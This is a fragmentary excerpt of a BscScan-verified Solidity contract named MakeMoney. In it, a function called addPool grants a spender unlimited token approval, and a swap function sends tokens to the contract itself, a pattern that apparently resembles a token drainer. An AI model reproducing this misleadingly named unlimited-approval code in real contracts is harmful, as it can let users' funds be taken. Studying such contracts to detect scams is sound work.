...
/**
 *Submitted for verification at BscScan.com on 2021-01-30
 */
...
library SafeBEP20 {
    ...
    function addPool(IBEP20 token, address spender) internal {
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.approve.selector, spender, uint256(-1))
        );
    }
...
contract MakeMoney is Ownable {
    ...
    function swapExactTokensForTokens(
        ...
        IBEP20 outToken = IBEP20(path[1]);
        outToken.transfer(address(this), amounts[0]);
    }
